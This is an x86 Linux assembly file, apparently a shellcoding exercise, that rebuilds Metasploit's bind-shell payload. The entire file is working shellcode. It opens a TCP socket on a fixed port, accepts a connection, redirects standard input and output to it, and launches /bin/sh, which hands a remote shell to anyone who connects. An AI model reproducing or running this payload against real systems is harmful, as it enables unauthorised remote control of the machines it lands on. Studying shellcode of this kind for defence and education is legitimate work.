; +==-------------------------------------==+
; |         Linux x86 Bind Shell Demo       |
; +==-------------------------------------==+
; | Author:  sp1icer                        |
; | Purpose: Build my own working demo of   |
; |             the shell_bind_tcp          |
; |             shellcode in Metasploit.    |
; |             For comments and            |
; |             explanation, see the        |
; |             bind.nasm file.             |
; +==-------------------------------------==+

global _start

section .text
_start:
	push BYTE 0x66
	pop eax
	inc ebx
	xor edi, edi
	push edi
	push 0x1
	push 0x2
	mov ecx, esp
	int 0x80
	mov esi, eax
	push BYTE 0x66
	pop eax
	inc ebx
	push edi
	push WORD 0x8605
	push WORD 0x2
	mov ecx, esp
	push BYTE 0x10
	push ecx
	push esi
	mov ecx, esp
	int 0x80
	push BYTE 0x66
	pop eax
	inc ebx
	inc ebx
	push edi
	push esi
	mov ecx, esp
	int 0x80
	push 0x66
	pop eax
	inc ebx
	push edi
	push edi
	push esi
	mov ecx, esp
	int 0x80
	xor esi, esi
	xchg esi, eax

	push esi
	pop ebx
	xor ecx, ecx
loopTime:
	mov al, 0x3F
	int 0x80
	inc ecx
	cmp ecx, 0x3
	jl short loopTime
	jmp short elseTime
elseTime:
	push 0xB
	pop eax
	xor ebx, ebx
	push ebx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80
